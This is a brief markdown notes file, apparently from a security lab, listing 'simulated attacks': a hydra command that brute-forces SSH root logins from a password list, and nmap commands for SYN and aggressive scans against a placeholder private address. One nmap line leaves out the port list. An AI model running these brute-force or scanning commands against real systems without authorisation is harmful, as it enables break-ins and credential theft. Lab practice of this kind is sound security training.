# Simulated Attacks

## SSH Brute Force
hydra -l root -P passwords.txt ssh://192.168.x.x

## Nmap Scan
nmap -sS -p 192.168.x.x
nmap -A 192.168.x.x
